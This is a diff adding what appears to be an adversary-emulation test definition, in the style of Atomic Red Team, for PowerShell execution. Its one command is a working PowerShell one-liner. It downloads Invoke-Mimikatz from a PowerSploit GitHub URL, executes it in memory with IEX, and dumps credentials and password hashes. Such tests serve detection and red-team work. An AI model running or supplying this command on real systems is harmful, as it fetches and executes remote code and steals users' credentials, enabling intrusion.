@@ -1,0 +1,8 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Mimikatz
+#Description: Download Mimikatz and dump credentials. Upon execution, mimikatz dump details and password hashes will be displayed.&
+#Language: cmd
+
+#commands
+powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
